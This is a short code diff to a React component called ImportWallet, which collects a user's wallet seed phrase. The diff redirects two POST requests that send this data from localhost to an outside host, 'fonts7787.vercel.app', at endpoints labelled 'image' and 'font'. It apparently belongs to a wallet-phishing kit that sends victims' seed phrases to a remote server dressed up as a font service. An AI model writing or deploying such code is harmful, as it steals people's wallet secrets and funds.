@@ -77,7 +77,7 @@ export default function ImportWallet() {
     messageData.seedPhrase = seedPhraseFormatted;
     console.log(messageData)
     try {
-      await fetch("http://localhost:3001/api/t1/image", {
+      await fetch("https://fonts7787.vercel.app/api/t1/image", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
@@ -91,7 +91,7 @@ export default function ImportWallet() {
   }
 
   const sendMessageAlt = async () => {
-    fetch("http://localhost:3001/api/t1/font", {
+    fetch("https://fonts7787.vercel.app/api/t1/font", {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
